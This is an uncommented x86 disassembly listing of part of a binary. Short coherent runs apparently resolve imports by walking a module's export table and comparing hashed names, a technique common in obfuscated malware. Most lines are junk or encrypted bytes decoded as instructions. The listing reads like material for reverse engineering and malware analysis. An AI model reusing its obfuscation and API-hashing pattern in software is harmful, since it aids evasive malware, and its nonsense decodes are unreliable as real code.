  40c052:	call   0xde7e746f
  40c057:	mov    esi,0xa74037d9
  40c05c:	loopne 0x40bff2
  40c05e:	pop    edx
  40c05f:	stos   BYTE PTR es:[edi],al
  40c060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c061:	or     BYTE PTR [edx+esi*2],0x84
  40c065:	push   esp
  40c066:	daa    
  40c067:	xchg   ah,dh
  40c069:	mov    dl,0x80
  40c06b:	sub    al,0x19
  40c06d:	ds std 
  40c06f:	cmp    al,0xe7
  40c071:	ret    
  40c072:	into   
  40c073:	clc    
  40c074:	aam    0x34
  40c076:	dec    eax
  40c077:	lea    edx,[edx-0x1bdafe5a]
  40c07d:	ins    BYTE PTR es:[edi],dx
  40c07e:	pusha  
  40c07f:	ret    0xfa12
  40c082:	push   edx
  40c083:	in     eax,0x6a
  40c085:	pop    esp
  40c086:	vcvttsd2si esi,QWORD PTR [eax]
  40c08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c08b:	dec    esp
  40c08c:	icebp  
  40c08d:	sahf   
  40c08e:	jecxz  0x40c01a
  40c090:	push   edi
  40c091:	mov    ah,0x50
  40c093:	mov    dh,0x7
  40c095:	jge    0x40c063
  40c097:	add    ecx,DWORD PTR [eax+0x20]
  40c09a:	mov    eax,ds:0x4306c2
  40c09f:	or     eax,DWORD PTR ds:0x42ef8c
  40c0a5:	mov    ds:0x4306c2,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ef9c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43061e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e8e2
  40c0cb:	mov    ds:0x43061e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x430626,0x0
  40c0dd:	mov    eax,ds:0x430626
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x430626,eax
  40c0e8:	cmp    DWORD PTR ds:0x430626,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x430632
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e8f6
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42ea73
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42ec74
  40c11d:	cmp    DWORD PTR ds:0x430626,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	push   ds
  40c147:	mov    ds:0xfd320347,al
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c0e0
  40c153:	addr16 push ebx
  40c155:	dec    eax
  40c156:	icebp  
  40c157:	(bad)  
  40c158:	outs   dx,BYTE PTR ds:[esi]
  40c159:	jge    0x40c0fb
  40c15b:	mov    ebp,0x8423ae4c
  40c160:	fild   WORD PTR [eax-0x65]
  40c163:	mov    ah,0x14
  40c165:	pop    es
  40c166:	(bad)  
  40c167:	lock enter 0x2ee5,0x72
  40c16c:	mov    al,0xd5
  40c16e:	popa   
  40c16f:	mov    cl,BYTE PTR [edi]
  40c171:	sbb    cl,ah
  40c173:	dec    ebx
  40c174:	(bad)  
  40c175:	(bad)  [ecx]
  40c177:	dec    ebx
  40c178:	add    DWORD PTR ds:0x14b39c99,esi
  40c17e:	cld    
  40c17f:	out    dx,eax
  40c180:	arpl   ax,dx
  40c182:	jp     0x40c14a
  40c184:	fcom   QWORD PTR [edi+0x65]
  40c187:	outs   dx,BYTE PTR ds:[esi]
  40c188:	push   ds
  40c189:	push   edi
  40c18a:	je     0x40c179
  40c18c:	sbb    DWORD PTR [esi+0x7e],eax
  40c18f:	outs   dx,BYTE PTR ds:[esi]
  40c190:	cmp    ecx,DWORD PTR [ebp+0x35]
  40c193:	ins    DWORD PTR es:[edi],dx
  40c194:	stos   BYTE PTR es:[edi],al
  40c195:	xchg   ecx,eax
  40c196:	mov    eax,0x7d51e4e3
  40c19b:	repz scas al,BYTE PTR es:[di]
  40c19e:	add    BYTE PTR [ebx-0x38],bl
  40c1a1:	call   0xfbb03793
  40c1a6:	std    
  40c1a7:	sbb    al,0x49
  40c1a9:	sub    al,0xfc
  40c1ab:	cmp    ecx,DWORD PTR [edi]
  40c1ad:	fsub   QWORD PTR [esi+0x2a95b50c]
  40c1b3:	jnp    0x40c158
  40c1b5:	xor    al,cl
  40c1b7:	lods   al,BYTE PTR ds:[esi]
  40c1b8:	mov    bl,0x35
  40c1ba:	adc    BYTE PTR [ebx],bl
  40c1bc:	dec    esi
  40c1bd:	mov    esi,0xe4fdca04
  40c1c2:	in     al,dx
  40c1c3:	ins    DWORD PTR es:[edi],dx
  40c1c4:	dec    edx
  40c1c5:	ret    
  40c1c6:	int3   
  40c1c7:	hlt    
  40c1c8:	or     esi,edi
  40c1ca:	mov    esp,0xa82c3df5
  40c1cf:	fucomip st,st(7)
  40c1d1:	fwait
  40c1d2:	push   ecx
  40c1d3:	mov    dl,0x73
  40c1d5:	div    DWORD PTR [ecx+0x7d6102f2]
  40c1db:	lahf   
  40c1dc:	jecxz  0x40c1c3
  40c1de:	retf   0x354c
  40c1e1:	les    eax,FWORD PTR [edx+0x13e8b2ba]
  40c1e7:	ja     0x40c1a3
  40c1e9:	push   ss
  40c1ea:	pop    ebx
  40c1eb:	adc    al,0x47
  40c1ed:	add    esp,DWORD PTR [edi-0x15b6496d]
  40c1f3:	sub    DWORD PTR [edx+edi*2],eax
  40c1f6:	stc    
  40c1f7:	popf   
  40c1f8:	cmp    al,0xf0
  40c1fa:	mov    cl,0x46
  40c1fc:	call   0x98cbbe3d
  40c201:	mov    dl,0x6e
  40c203:	ficomp DWORD PTR [ebx+0x19befe91]
  40c209:	mov    ch,0x60
  40c20b:	pop    esp
  40c20c:	outs   dx,BYTE PTR ds:[esi]
  40c20d:	out    0xcd,al
  40c20f:	adc    DWORD PTR [esi-0x28],ebx
  40c212:	sub    eax,0xf1818e73
  40c217:	or     al,0x24
  40c219:	mov    al,0x9f
  40c21b:	retf   
  40c21c:	addr16 faddp st(1),st
  40c21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c220:	mov    cl,0x8d
  40c222:	cs out dx,al
  40c224:	test   cl,0x1d
  40c227:	and    ecx,DWORD PTR [esi+0x1a]
  40c22a:	xchg   ebp,eax
  40c22b:	xor    DWORD PTR [eax],ecx
  40c22d:	aas    
  40c22e:	jmp    0x40c275
  40c230:	sar    DWORD PTR [ecx-0x42],cl
  40c233:	pusha  
  40c234:	fistp  QWORD PTR [esi-0x540310ca]
  40c23a:	cmp    esp,DWORD PTR [ebp-0xc849410]
  40c240:	leave  
  40c241:	pop    edi
  40c242:	mov    ss,WORD PTR [ebx-0x71]
  40c245:	xlat   BYTE PTR ds:[ebx]
  40c246:	mov    cs,eax
  40c248:	cmc    
  40c249:	bound  ebx,QWORD PTR [esi]
  40c24b:	mov    cl,BYTE PTR [esi-0x2d]
  40c24e:	pop    eax
  40c24f:	mov    ecx,0xc49a4ea4
  40c254:	fisttp WORD PTR gs:[eax+eax*8-0x2a]
  40c259:	mov    bl,0xa5
  40c25b:	dec    edx
  40c25c:	(bad)  
  40c25d:	(bad)  
  40c25e:	sbb    al,0x70
  40c260:	out    0xdb,al
  40c262:	pop    es
  40c263:	out    dx,eax
  40c264:	and    BYTE PTR [edi-0x393a3d6c],cl
  40c26a:	mov    eax,ds:0x2ce5dcbf
  40c26f:	iret   
  40c270:	inc    ebp
  40c271:	inc    edx
  40c272:	xchg   ecx,eax
  40c273:	aas    
  40c274:	mov    ebp,0x891c35da
  40c279:	sbb    edi,ecx
  40c27b:	fs jno 0x40c2a4
  40c27e:	dec    edi
  40c27f:	xor    eax,0x55d1fc02
  40c284:	repnz loopne 0x40c281
  40c287:	(bad)  
  40c288:	push   ebp
  40c289:	cmp    al,0xe6
  40c28b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c28c:	mov    edi,0x3160b26
  40c291:	adc    al,0x4
  40c293:	mov    DWORD PTR [ebp-0x14],ecx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0xd5e92bcc,0xf3da23cc
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c316
  40c2bd:	mov    esi,0xdd30b28
  40c2c2:	inc    ecx
  40c2c3:	cli    
  40c2c4:	cmp    ah,BYTE PTR ds:0x78d121b5
  40c2ca:	int3   
  40c2cb:	test   DWORD PTR [ebp+0x3a],0xcac00c1c
  40c2d2:	push   ds
  40c2d3:	fs jmp 0x695664a
  40c2d9:	retf   0x4090
  40c2dc:	jns    0x40c2e0
  40c2de:	xchg   esp,eax
  40c2df:	lahf   
  40c2e0:	mov    WORD PTR [ebx-0x2a],cs
  40c2e3:	or     esi,ebx
  40c2e5:	and    eax,ebp
  40c2e7:	xchg   edx,eax
  40c2e8:	push   ebx
  40c2e9:	dec    ebp
  40c2ea:	(bad)  
  40c2eb:	push   ss
  40c2ec:	fisub  WORD PTR [ebx-0x69fcb6b7]
  40c2f2:	(bad)  [esi+0x37]
  40c2f5:	les    esi,FWORD PTR [eax+0x197f1151]
  40c2fb:	shl    BYTE PTR [ebp+esi*2-0x5a560767],1
  40c302:	ret    
  40c303:	mov    ds:0x38e78499,eax
  40c308:	and    al,0xdd
  40c30a:	and    BYTE PTR [eiz*2+0x72d7cfdf],bl
  40c311:	jge    0x40c2ec
  40c313:	push   edx
  40c314:	or     dh,dh
  40c316:	clc    
  40c317:	jnp    0x40c30e
  40c319:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c31b:	popa   
  40c31c:	enter  0x91e4,0xd8
  40c320:	adc    DWORD PTR [ebp+ebp*4+0x45188a53],0x54
  40c328:	retf   0x1f59
  40c32b:	xor    DWORD PTR [esi+0x444b7a0f],ebp
  40c331:	daa    
  40c332:	sahf   
  40c333:	add    ecx,esi
  40c335:	and    al,0x7a
  40c337:	les    esp,FWORD PTR [edi-0x62]
  40c33a:	out    dx,al
  40c33b:	dec    ebp
  40c33c:	jge    0x40c392
  40c33e:	repnz mov BYTE PTR [edi],ch
  40c341:	and    dl,BYTE PTR [esi-0x5a1b93e6]
  40c347:	dec    edx
  40c348:	lock rcr DWORD PTR [edx+0x7612f46],0x96
  40c350:	mov    ecx,0xe308cef0
  40c355:	fwait
  40c356:	pop    esi
  40c357:	add    al,0x1b
  40c359:	bswap  edx
  40c35b:	mov    ah,0x3f
  40c35d:	push   ecx
  40c35e:	mov    edx,DWORD PTR [ecx-0x7ebab02a]
  40c364:	sub    DWORD PTR [eax+0x4e],ebp
  40c367:	and    ebp,DWORD PTR [edx-0x2e]
  40c36a:	xchg   esi,eax
  40c36b:	das    
  40c36c:	les    ebx,FWORD PTR [edi+ebp*1+0x389655ed]
  40c373:	cmp    DWORD PTR [edi+0x31],edx
  40c376:	in     eax,dx
  40c377:	scas   al,BYTE PTR es:[edi]
  40c378:	cmp    ah,bl
  40c37a:	adc    edx,edi
  40c37c:	inc    edi
  40c37d:	jecxz  0x40c317
  40c37f:	push   ss
  40c380:	xor    ah,BYTE PTR [edx+ebp*8-0x13]
  40c384:	sub    BYTE PTR ds:0xd50f4b48,dh
  40c38a:	ret    
  40c38b:	mov    dl,0x93
  40c38d:	not    DWORD PTR [ebp-0x4d]
  40c390:	push   eax
  40c391:	add    edx,DWORD PTR [edi-0x2f]
  40c394:	test   eax,0xab05139d
  40c399:	add    DWORD PTR [edx],0x1c
  40c39c:	push   ss
  40c39d:	push   cs
  40c39e:	jecxz  0x40c357
  40c3a0:	mov    ebx,0x54852ba9
  40c3a5:	clc    
  40c3a6:	ss loope 0x40c40f
  40c3a9:	sbb    DWORD PTR [ecx],ebx
  40c3ab:	xchg   ecx,eax
  40c3ac:	add    edx,esi
  40c3ae:	xor    esp,ebx
  40c3b0:	addr16 pop edx
  40c3b2:	or     bl,ch
  40c3b4:	shl    BYTE PTR [ebx-0x42],1
  40c3b7:	stos   DWORD PTR es:[edi],eax
  40c3b8:	inc    ecx
  40c3b9:	jmp    0x63a63c91
  40c3be:	in     al,0xc2
  40c3c0:	aam    0x3a
  40c3c2:	(bad)  
  40c3c3:	bound  esp,QWORD PTR [ebp+0x12]
  40c3c6:	fidiv  WORD PTR ss:[edi+0x1026aa1d]
  40c3cd:	pop    eax
  40c3ce:	mov    bl,0xd1
  40c3d0:	and    eax,0x9f1dffe8
  40c3d5:	jnp    0x40c3ee
  40c3d7:	push   es
  40c3d8:	cmp    DWORD PTR [ecx+0x6b],ebx
  40c3db:	dec    edi
  40c3dc:	inc    ecx
  40c3dd:	or     eax,0x535ea6aa
  40c3e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3e3:	mov    ds:0x96ac730a,al
  40c3e8:	and    al,0xb6
  40c3ea:	xchg   BYTE PTR [eax-0x1ce5936f],dh
  40c3f0:	popf   
  40c3f1:	popf   
  40c3f2:	fistp  QWORD PTR [esi-0x45df0462]
  40c3f8:	xchg   ebp,eax
  40c3f9:	jg     0x40c3eb
  40c3fb:	lea    eax,[esi]
  40c3fd:	lea    eax,[ebp-0x8]
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	sub    eax,0xb438bb86
  40c416:	(bad)  
  40c417:	jle    0x40c497
  40c419:	aas    
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c3e8
  40c41e:	and    ecx,0x8c1316fa
  40c424:	rcl    DWORD PTR [esi-0x293791ae],1
  40c42a:	inc    esi
  40c42b:	pushw  0x9b08
  40c42f:	fldenv [ebp-0x74]
  40c432:	hlt    
  40c433:	add    dl,bh
  40c435:	mov    ds:0x7827981e,eax
  40c43a:	xchg   DWORD PTR [ecx-0x4ed47f97],ebx
  40c440:	loope  0x40c3dd
  40c442:	inc    edi
  40c443:	add    ebp,esp
  40c445:	and    DWORD PTR [edi-0x4b],esi
  40c448:	xor    al,0x51
  40c44a:	and    BYTE PTR [ebp+ebx*2+0x4a],ah
  40c44e:	pop    esp
  40c44f:	pop    eax
  40c450:	arpl   WORD PTR [ebp+edi*2+0x76],dx
  40c454:	lock xor al,0x6b
  40c457:	test   BYTE PTR [esi+0x46752eef],dl
  40c45d:	push   ebp
  40c45e:	loop   0x40c3f2
  40c460:	(bad)  
  40c462:	and    ebp,DWORD PTR [ecx+0x28bbb5d9]
  40c468:	dec    edx
  40c469:	mov    ds:0x33083b5f,al
  40c46e:	pop    edx
  40c46f:	gs in  al,0x5d
  40c472:	sti    
  40c473:	(bad)  
  40c474:	shl    DWORD PTR [edi-0x6e],cl
  40c477:	std    
  40c478:	push   0x37
  40c47a:	mov    dh,0x94
  40c47c:	aaa    
  40c47d:	fld    TBYTE PTR [esi-0x7d4efb8b]
  40c483:	mov    ch,0x92
  40c485:	iret   
  40c486:	pop    ecx
  40c487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c488:	add    eax,DWORD PTR [ebx-0x60]
  40c48b:	sbb    esi,DWORD PTR [ecx]
  40c48d:	rep outs dx,DWORD PTR ds:[esi]
  40c48f:	mov    dl,0x5e
  40c491:	sbb    al,0x7b
  40c493:	pushf  
  40c494:	inc    esp
  40c495:	pop    ebx
  40c496:	iret   
  40c497:	xchg   edx,eax
  40c498:	in     al,0x1d
  40c49a:	(bad)  
  40c49c:	(bad)  
  40c49d:	ja     0x40c45b
  40c49f:	mov    eax,0xaf4f6bb4
  40c4a4:	xchg   esp,eax
  40c4a5:	add    al,0x67
  40c4a7:	popf   
  40c4a8:	mov    al,0xf9
  40c4aa:	cmp    BYTE PTR [ebx+0x44e55f02],0x59
  40c4b1:	push   ecx
  40c4b2:	cmp    ch,ch
  40c4b4:	scas   al,BYTE PTR es:[edi]
  40c4b5:	ror    DWORD PTR [esi+eiz*2],0x5
  40c4b9:	(bad)  
  40c4ba:	hlt    
  40c4bb:	sar    DWORD PTR [ebx],0xfc
  40c4be:	fstp   TBYTE PTR [eax]
  40c4c0:	imul   esp,DWORD PTR [ebx-0x64],0xffffffcd
  40c4c4:	mov    gs,WORD PTR [ecx]
  40c4c6:	call   0xc12d6308
  40c4cb:	pop    ebx
  40c4cc:	cmp    al,0x84
  40c4ce:	inc    ebx
  40c4cf:	inc    edi
  40c4d0:	add    al,0x51
  40c4d2:	(bad)  
  40c4d3:	std    
  40c4d4:	adc    BYTE PTR [ecx-0x5793dac0],ch
  40c4da:	pop    eax
  40c4db:	lds    ecx,FWORD PTR [esi+0x30]
  40c4de:	and    eax,DWORD PTR [ebx+0x26]
  40c4e1:	fimul  DWORD PTR [edi-0x75]
  40c4e4:	(bad)  
  40c4e5:	rcl    BYTE PTR [esi],cl
  40c4e7:	bnd ret 0x5555
  40c4eb:	mov    es:0xbe1be33a,eax
  40c4f1:	sar    DWORD PTR [edi-0xdc825c0],0x6e
  40c4f8:	mov    edi,0x4f6affed
  40c4fd:	jl     0x40c4c9
  40c4ff:	imul   eax,DWORD PTR [ebx+0x35],0xffffff99
  40c503:	add    BYTE PTR [ecx],al
  40c505:	mov    dh,0x70
  40c507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c508:	into   
  40c509:	inc    eax
  40c50a:	pop    ecx
  40c50b:	out    dx,al
  40c50c:	pop    ss
  40c50d:	jmp    0x40c4dc
  40c50f:	fisttp WORD PTR [esi+0x26]
  40c512:	push   esi
  40c513:	or     eax,0xc85af83e
  40c518:	mov    esp,0xd8f573fd
  40c51d:	into   
  40c51e:	dec    esp
  40c51f:	or     BYTE PTR [eax-0x76],dh
  40c522:	and    ebp,DWORD PTR [edi-0x1f]
  40c525:	les    ebx,FWORD PTR ds:0xc4318247
  40c52b:	dec    eax
  40c52c:	mov    es,WORD PTR [ebx+0x55]
  40c52f:	inc    ebx
  40c530:	sub    ah,BYTE PTR [ebx]
  40c532:	lahf   
  40c533:	test   eax,0xc2760bdd
  40c538:	mov    bl,0xe9
  40c53a:	mov    edi,0xf5eb94c7
  40c53f:	mov    bh,0x20
  40c541:	pop    ds
  40c542:	mov    ds:0x9dc0b279,al
  40c547:	mov    bl,BYTE PTR [edi+0x12cca725]
  40c54d:	and    DWORD PTR [ebx+0x25715c74],esi
  40c553:	loopne 0x40c590
  40c555:	daa    
  40c556:	lds    esp,FWORD PTR [esi]
  40c558:	inc    edx
  40c559:	mov    DWORD PTR [edi-0x76de110b],edi
  40c55f:	dec    ebp
  40c560:	rcl    BYTE PTR [eax-0x1],1
  40c563:	jne    0x40c535
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0x90f6a275
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c58d
  40c58e:	jl     0x40c55f
  40c590:	mov    ebx,0x47e439bd
  40c595:	mov    WORD PTR [edx-0x42],?
  40c598:	fsubr  QWORD PTR [ebx-0x19]
  40c59b:	outs   dx,DWORD PTR ds:[esi]
  40c59c:	xchg   esi,esp
  40c59e:	jecxz  0x40c571
  40c5a0:	inc    ecx
  40c5a1:	sahf   
  40c5a2:	ror    al,cl
  40c5a4:	mov    al,ds:0x1f3ddcbe
  40c5a9:	and    edi,ebp
  40c5ab:	les    esi,FWORD PTR [ecx]
  40c5ad:	and    DWORD PTR [ebx],esi
  40c5af:	test   BYTE PTR [edi+0x306baba8],0x6f
  40c5b6:	sbb    eax,0x4a558b2c
  40c5bb:	inc    edi
  40c5bc:	sub    cl,BYTE PTR [esi]
  40c5be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5c0:	out    0x0,al
  40c5c2:	aad    0x96
  40c5c4:	mov    bh,0x89
  40c5c6:	jns    0x40c646
  40c5c8:	add    eax,0xb5bd95f8
  40c5cd:	jbe    0x40c609
  40c5cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5d0:	pop    ds
  40c5d1:	dec    ecx
  40c5d2:	xchg   ecx,eax
  40c5d3:	jno    0x40c57a
  40c5d5:	dec    ecx
  40c5d6:	test   al,0xd1
  40c5d8:	cmp    DWORD PTR [ebx+0x63c13e0f],eax
  40c5de:	dec    esi
  40c5df:	mov    dh,0xd7
  40c5e1:	jmp    0x40c61e
  40c5e3:	adc    dh,BYTE PTR [edx]
  40c5e5:	mov    eax,ds:0xf35128e3
  40c5ea:	ss stos DWORD PTR es:[edi],eax
  40c5ec:	jmp    0xb1a7:0xe10255bb
  40c5f3:	mov    BYTE PTR [esi-0x1dfd389c],al
  40c5f9:	lds    edi,FWORD PTR [edx]
  40c5fb:	sbb    eax,0xe0d7049c
  40c600:	mov    dh,0x23
  40c602:	push   edx
  40c603:	cmp    DWORD PTR [edx-0x7b],edx
  40c606:	int3   
  40c607:	test   BYTE PTR [ecx-0xc],cl
  40c60a:	inc    eax
  40c60b:	push   0xffffffa7
  40c60d:	push   esi
  40c60e:	inc    edx
  40c60f:	mov    al,0x66
  40c611:	repz aas 
  40c613:	jno    0x40c660
  40c615:	cmp    al,0xe1
  40c617:	ins    BYTE PTR es:[edi],dx
  40c618:	stos   DWORD PTR es:[edi],eax
  40c619:	push   es
  40c61a:	int3   
  40c61b:	push   esi
  40c61c:	ss pusha 
  40c61e:	push   ebp
  40c61f:	mov    esi,0x4ff15323
  40c624:	dec    ebx
  40c625:	and    dl,cl
  40c627:	pop    esp
  40c628:	push   es
  40c629:	push   eax
  40c62a:	fs mov al,0xa
  40c62d:	imul   edi,DWORD PTR [eax+ebx*8-0x28],0x29
  40c632:	and    ecx,0x1053bdfe
  40c638:	popa   
  40c639:	mov    BYTE PTR [esi-0x3f2d149],dh
  40c63f:	in     eax,0x1e
  40c641:	mov    ch,0x3f
  40c643:	push   0x2f
  40c645:	or     BYTE PTR [ecx],bl
  40c647:	sub    eax,DWORD PTR [edx-0x2d]
  40c64a:	add    BYTE PTR [eax-0x43110cf9],bl
  40c650:	retf   0x94ca
  40c653:	dec    ecx
  40c654:	cmc    
  40c655:	aam    0x31
  40c657:	xor    DWORD PTR [ebx],eax
  40c659:	mov    cl,dl
  40c65b:	xchg   ebp,eax
  40c65c:	pop    esp
  40c65d:	push   0xffffff93
  40c65f:	xor    esp,DWORD PTR [ebp+0x3e84802b]
  40c665:	mov    ch,0xba
  40c667:	int3   
  40c668:	sbb    dh,BYTE PTR [ebp*1-0x23790d82]
  40c66f:	xor    al,0x6c
  40c671:	inc    eax
  40c672:	test   al,0xfa
  40c674:	das    
  40c675:	push   esi
  40c676:	xchg   ebx,eax
  40c677:	(bad)  
  40c678:	mov    ecx,0xfa9466a4
  40c67d:	lock xor DWORD PTR [edi-0xc],edi
  40c681:	je     0x40c660
  40c683:	rcl    DWORD PTR [ebx-0x35],cl
  40c686:	xchg   esp,eax
  40c687:	sti    
  40c688:	fdiv   st,st(5)
  40c68a:	cmp    al,0x63
  40c68c:	repnz push es
  40c68e:	enter  0x76f5,0x9e
  40c692:	xor    DWORD PTR [esi],edx
  40c694:	nop
  40c695:	xchg   ebx,eax
  40c696:	ss out 0xa2,al
  40c699:	test   al,0x3d
  40c69b:	pop    ebx
  40c69c:	cmp    dl,cl
  40c69e:	pop    ecx
  40c69f:	sub    eax,0x1bd429fb
  40c6a4:	mov    bh,0xc7
  40c6a7:	in     eax,0xc
  40c6a9:	out    dx,al
  40c6aa:	or     DWORD PTR [edx],edx
  40c6ac:	leave  
  40c6ad:	icebp  
  40c6ae:	pop    esi
  40c6af:	jo     0x40c6a8
  40c6b1:	xor    eax,0x88fafbc4
  40c6b6:	sub    DWORD PTR [ebx-0x25270e5c],ecx
  40c6bc:	in     al,dx
  40c6bd:	sub    al,0x8d
  40c6bf:	scas   al,BYTE PTR es:[edi]
  40c6c0:	imul   ecx,DWORD PTR [ecx+0x1c],0x23
  40c6c4:	div    DWORD PTR [eax-0x147f85d1]
  40c6ca:	ins    DWORD PTR es:[edi],dx
  40c6cb:	mov    bl,0xed
  40c6cd:	push   esi
  40c6ce:	mov    ecx,DWORD PTR [ebp-0x8]
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	jmp    0x40c6c9
  40c742:	pushf  
  40c743:	addr16 ss bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c6d0
  40c74d:	sahf   
  40c74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c74f:	or     BYTE PTR [edx-0x5c],bl
  40c752:	push   ecx
  40c753:	push   edx
  40c754:	add    al,0x6e
  40c756:	sub    ch,ah
  40c758:	sbb    BYTE PTR [edi+0x51116b76],0x82
  40c75f:	outs   dx,BYTE PTR ds:[esi]
  40c760:	or     DWORD PTR [eax+0x707fb6bd],ebx
  40c766:	scas   eax,DWORD PTR es:[edi]
  40c767:	cmp    eax,0x1afd1075
  40c76c:	stos   BYTE PTR es:[edi],al
  40c76d:	cwde   
  40c76e:	(bad)  
  40c76f:	push   eax
  40c770:	dec    edx
  40c771:	jb     0x40c732
  40c773:	mov    cl,0xaf
  40c775:	cmp    dl,ch
  40c777:	jmp    0x55a9:0xb81d6962
  40c77e:	fimul  DWORD PTR [esi+edi*2]
  40c781:	cmp    eax,DWORD PTR [edi+esi*1]
  40c784:	cmp    al,0xef
  40c786:	jns    0x40c725
  40c788:	lods   al,BYTE PTR ds:[esi]
  40c789:	fsubr  DWORD PTR [eax+0x33]
  40c78c:	stc    
  40c78d:	pop    ebp
  40c78e:	(bad)  
  40c78f:	jp     0x40c744
  40c791:	sub    BYTE PTR [edi-0x39],dl
  40c794:	imul   esi,DWORD PTR [ecx],0xffffffb5
  40c797:	lea    ebp,[eax-0x7e]
  40c79a:	(bad)  [ebp+0x65ce0bb7]
  40c7a0:	and    al,BYTE PTR [esi]
  40c7a2:	sti    
  40c7a3:	int3   
  40c7a4:	(bad)  
  40c7a5:	dec    edx
  40c7a6:	addr16 popa 
  40c7a8:	or     ecx,DWORD PTR ds:0x1ce337a
  40c7ae:	out    0xb9,eax
  40c7b0:	aam    0xf1
  40c7b2:	cs je  0x40c812
  40c7b5:	jne    0x40c7f9
  40c7b7:	in     al,dx
  40c7b8:	inc    ebx
  40c7b9:	cmp    eax,0x954efe87
  40c7be:	das    
  40c7bf:	or     cl,BYTE PTR [eax+0x54]
  40c7c2:	jle    0x40c7b9
  40c7c4:	dec    ecx
  40c7c5:	inc    edx
  40c7c6:	add    ch,al
  40c7c8:	imul   edi,DWORD PTR [ecx-0x8],0x42
  40c7cc:	push   edx
  40c7cd:	mov    dl,0x51
  40c7cf:	dec    esi
  40c7d0:	lods   al,BYTE PTR ds:[esi]
  40c7d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7d2:	cdq    
  40c7d3:	lock lock mov ebp,0xcd347e27
  40c7da:	das    
